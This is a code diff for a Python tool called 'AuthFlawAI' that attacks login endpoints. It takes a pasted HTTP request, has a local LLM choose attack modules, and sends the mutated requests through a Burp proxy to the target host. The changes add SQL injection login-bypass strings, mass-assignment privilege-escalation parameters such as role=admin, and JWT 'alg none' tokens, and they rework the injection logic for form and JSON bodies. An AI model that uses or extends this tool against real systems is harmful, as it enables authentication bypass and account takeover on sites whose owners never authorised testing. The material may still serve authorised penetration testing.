@@ -111,49 +111,56 @@ class AuthFlawAI:
         # Check body for credentials
         if '"email"' in body and '"password"' in body:
             return "JSON_Login"
-        if 'email=' in body or 'username=' in body:
+        if 'email=' in body or 'username=' in body or 'user=' in body:
             return "Form_Login"
+        if 'password=' in body:
+            return "Form_Login"
+        
+        # Check content type for form data
+        content_type = headers.get('Content-Type', '')
+        if 'application/x-www-form-urlencoded' in content_type:
+            return "Form_Login"
+        if 'application/json' in content_type:
+            return "JSON_Login"
         
         return "Unknown"
     
     def ai_analyze_request(self, request: Dict) -> Dict:
         """Use local AI to analyze request and suggest attack modules"""
         
-        prompt = f"""
-Analyze this HTTP request and identify authentication vulnerabilities.
+        prompt = f"""Analyze this HTTP authentication request and respond with ONLY valid JSON.
 
-METHOD: {request['method']}
-PATH: {request['path']}
-AUTH_TYPE: {request['auth_type']}
+Request Details:
+- Method: {request['method']}
+- Path: {request['path']}
+- Auth Type: {request['auth_type']}
+- Body: {request['body'][:200]}
 
-HEADERS:
-{json.dumps(request['headers'], indent=2)}
-
-BODY:
-{request['body'][:500]}
-
-Based on this request, answer:
-1. What authentication mechanism is being used?
-2. What potential authentication bypass vulnerabilities exist?
-3. Which attack modules should I run? (pick from: MassAssignment, SQLi, HostHeader, JWT_None, JWT_Confusion, RateLimit, SessionFixation, RegistrationPrivEsc)
-4. Generate 3 specific attack payloads to try FIRST.
-
-Return ONLY valid JSON:
+Respond with ONLY this JSON structure (no other text):
 {{
-    "auth_mechanism": "string",
-    "potential_vulns": ["vuln1", "vuln2"],
-    "modules_to_run": ["module1", "module2"],
-    "payloads": ["payload1", "payload2", "payload3"]
-}}
-"""
+    "auth_mechanism": "Form_Login",
+    "potential_vulns": ["SQLi", "MassAssignment"],
+    "modules_to_run": ["SQLi", "MassAssignment"],
+    "payloads": ["admin' OR '1'='1' --", "role=admin"]
+}}"""
         
         if self.ai:
             try:
                 response = self.ai.generate(model="llama3.2", prompt=prompt)
-                result = json.loads(response['response'])
-                return result
+                # Try to extract JSON from response
+                response_text = response['response'].strip()
+                
+                # Try to find JSON in the response
+                if '{' in response_text:
+                    json_start = response_text.find('{')
+                    json_end = response_text.rfind('}') + 1
+                    json_str = response_text[json_start:json_end]
+                    result = json.loads(json_str)
+                    return result
+                else:
+                    raise ValueError("No JSON found in response")
             except Exception as e:
-                print(f"{Fore.YELLOW}AI Analysis failed: {e}, using fallback")
+                print(f"{Fore.YELLOW}  AI unavailable ({str(e)[:50]}), using fallback")
         
         return self._fallback_analysis(request)
     
@@ -168,12 +175,20 @@ Return ONLY valid JSON:
                 '{"alg":"none"}.eyJyb2xlIjoiYWRtaW4ifQ.',
                 'HS256 signed with RS256 public key'
             ]
-        elif 'email' in request['body']:
+        elif request['auth_type'] in ["JSON_Login", "Form_Login"]:
             modules = ["SQLi", "MassAssignment", "RegistrationPrivEsc"]
             payloads = [
                 '"email":"admin\' OR \'1\'=\'1\' --"',
                 '"role":"admin"',
                 '"is_admin":true'
+            ]
+        elif request['auth_type'] == "Form_Login" or 'login' in request['path'].lower():
+            # Default to form-based attacks for login endpoints
+            modules = ["SQLi", "MassAssignment"]
+            payloads = [
+                'admin\' OR \'1\'=\'1\' --',
+                'admin\' OR 1=1--',
+                '\' OR \'1\'=\'1'
             ]
         
         return {
@@ -187,40 +202,75 @@ Return ONLY valid JSON:
         """Generate mutated requests based on AI decision"""
         variants = []
         
+        # Detect if body is JSON or form data
+        is_json = original['headers'].get('Content-Type', '').lower().find('application/json') != -1
+        is_form = original['headers'].get('Content-Type', '').lower().find('application/x-www-form-urlencoded') != -1
+        
         for module in ai_decision.get('modules_to_run', []):
-            for payload in ai_decision.get('payloads', []):
-                variant = original.copy()
-                variant['headers'] = original['headers'].copy()
+            if module == "SQLi":
+                # SQL Injection payloads
+                sqli_payloads = [
+                    "admin' OR '1'='1' --",
+                    "admin' OR '1'='1' #",
+                    "admin'--",
+                    "' OR 1=1--",
+                    "') OR ('1'='1'--"
+                ]
                 
-                if module == "SQLi":
-                    # Inject SQLi into email field
-                    if 'email' in variant['body']:
-                        variant['body'] = re.sub(
-                            r'"email"\s*:\s*"[^"]*"',
-                            f'{payload}',
-                            variant['body']
-                        )
+                for payload in sqli_payloads:
+                    variant = original.copy()
+                    variant['headers'] = original['headers'].copy()
+                    
+                    if is_form:
+                        # Inject into form data
+                        body = variant['body']
+                        # Try to inject into username field
+                        if 'username=' in body:
+                            body = re.sub(r'username=([^&]*)', f'username={payload}', body)
+                        elif 'email=' in body:
+                            body = re.sub(r'email=([^&]*)', f'email={payload}', body)
+                        variant['body'] = body
+                    elif is_json:
+                        # Inject into JSON
+                        if 'email' in variant['body']:
+                            variant['body'] = re.sub(
+                                r'"email"\s*:\s*"[^"]*"',
+                                f'"email":"{payload}"',
+                                variant['body']
+                            )
+                    
+                    variants.append({
+                        "module": module,
+                        "payload": payload,
+                        "request": variant
+                    })
+            
+            elif module == "MassAssignment":
+                # Mass assignment payloads
+                mass_payloads = [
+                    ('role', 'admin'),
+                    ('is_admin', 'true'),
+                    ('admin', '1'),
+                    ('user_type', 'admin')
+                ]
                 
-                elif module == "MassAssignment":
-                    # Add role parameter
-                    if variant['body'].strip().endswith('}'):
-                        variant['body'] = variant['body'].rstrip().rstrip('}') + f',{payload}' + '}'
-                
-                elif module == "RegistrationPrivEsc":
-                    # Add admin flag
-                    if variant['body'].strip().endswith('}'):
-                        variant['body'] = variant['body'].rstrip().rstrip('}') + f',{payload}' + '}'
-                
-                elif module == "HostHeader":
-                    # Inject malicious host
-                    variant['headers']['Host'] = payload
-                    variant['headers']['X-Forwarded-Host'] = payload
-                
-                variants.append({
-                    "module": module,
-                    "payload": payload,
-                    "request": variant
-                })
+                for param_name, param_value in mass_payloads:
+                    variant = original.copy()
+                    variant['headers'] = original['headers'].copy()
+                    
+                    if is_form:
+                        # Add to form data
+                        variant['body'] = original['body'] + f'&{param_name}={param_value}'
+                    elif is_json:
+                        # Add to JSON
+                        if variant['body'].strip().endswith('}'):
+                            variant['body'] = variant['body'].rstrip().rstrip('}') + f',"{param_name}":"{param_value}"' + '}'
+                    
+                    variants.append({
+                        "module": module,
+                        "payload": f"{param_name}={param_value}",
+                        "request": variant
+                    })
         
         return variants
     
@@ -228,16 +278,30 @@ Return ONLY valid JSON:
         """Send request through Burp proxy (appears in HTTP History)"""
         try:
             host = variant['request']['headers'].get('Host', 'target.com')
-            url = f"https://{host}{variant['request']['path']}"
             
-            response = self.session.request(
-                method=variant['request']['method'],
-                url=url,
-                headers=variant['request']['headers'],
-                data=variant['request']['body'] if variant['request']['method'] == 'POST' else None,
-                params=variant['request'].get('params', {}),
-                timeout=10
-            )
+            # Determine protocol based on original request or default to http for localhost
+            if 'localhost' in host or '127.0.0.1' in host:
+                url = f"http://{host}{variant['request']['path']}"
+            else:
+                url = f"https://{host}{variant['request']['path']}"
+            
+            # Prepare request data
+            request_kwargs = {
+                'method': variant['request']['method'],
+                'url': url,
+                'headers': variant['request']['headers'],
+                'timeout': 10
+            }
+            
+            # Add body for POST requests
+            if variant['request']['method'] == 'POST':
+                request_kwargs['data'] = variant['request']['body']
+            
+            # Add params for GET requests
+            if variant['request'].get('params'):
+                request_kwargs['params'] = variant['request']['params']
+            
+            response = self.session.request(**request_kwargs)
             
             return {
                 "status": response.status_code,
@@ -323,7 +387,8 @@ Return JSON:
         print(f"\n{Fore.YELLOW}[4/5] Testing via Burp proxy...")
         for i, variant in enumerate(variants, 1):
             print(f"\n  [{i}/{len(variants)}] Testing: {variant['module']}")
-            print(f"    Payload: {variant['payload'][:50]}...")
+            print(f"    Payload: {variant['payload'][:80]}...")
+            print(f"    Modified Body: {variant['request']['body'][:100]}...")
             
             response = self.send_to_burp_repeater(variant)
             if response:
@@ -376,25 +441,65 @@ Return JSON:
         print(f"{Fore.GREEN}[+] Report saved to reports/findings.json")
 
 def main():
-    print(f"{Fore.CYAN}Paste your HTTP request (press Enter twice when done):")
-    lines = []
-    while True:
+    import sys
+    import signal
+    
+    # Handle Ctrl+C gracefully
+    def signal_handler(sig, frame):
+        print(f"\n\n{Fore.YELLOW}[*] Scan interrupted by user")
+        print(f"{Fore.CYAN}[*] Partial results may be available in reports/findings.json")
+        sys.exit(0)
+    
+    signal.signal(signal.SIGINT, signal_handler)
+    
+    # Check if file input is provided
+    if len(sys.argv) > 1:
+        # Read from file
         try:
-            line = input()
-            if not line and lines:
+            with open(sys.argv[1], 'r', encoding='utf-8') as f:
+                raw_request = f.read()
+            print(f"{Fore.GREEN}[+] Loaded request from file: {sys.argv[1]}\n")
+        except FileNotFoundError:
+            print(f"{Fore.RED}[!] File not found: {sys.argv[1]}")
+            return
+        except Exception as e:
+            print(f"{Fore.RED}[!] Error reading file: {e}")
+            return
+    else:
+        # Interactive input
+        print(f"{Fore.CYAN}Paste your HTTP request (press Enter twice when done):")
+        print(f"{Fore.YELLOW}TIP: For requests with special characters, save to a file and run: python authflaw.py request.txt\n")
+        lines = []
+        empty_count = 0
+        while True:
+            try:
+                line = input()
+                if not line:
+                    empty_count += 1
+                    if empty_count >= 2:  # Two consecutive empty lines
+                        break
+                else:
+                    empty_count = 0
+                lines.append(line)
+            except EOFError:
                 break
-            lines.append(line)
-        except EOFError:
-            break
+            except KeyboardInterrupt:
+                print(f"\n{Fore.YELLOW}[*] Input cancelled")
+                return
+        
+        raw_request = '\n'.join(lines)
     
-    raw_request = '\n'.join(lines)
-    
-    if not raw_request:
-        print(f"{Fore.RED}No request provided!")
+    if not raw_request or not raw_request.strip():
+        print(f"{Fore.RED}[!] No request provided!")
         return
     
-    tool = AuthFlawAI()
-    tool.run(raw_request)
+    try:
+        tool = AuthFlawAI()
+        tool.run(raw_request)
+    except KeyboardInterrupt:
+        print(f"\n\n{Fore.YELLOW}[*] Scan interrupted by user")
+        print(f"{Fore.CYAN}[*] Check Burp HTTP History for requests sent so far")
+        sys.exit(0)
 
 if __name__ == "__main__":
     main()
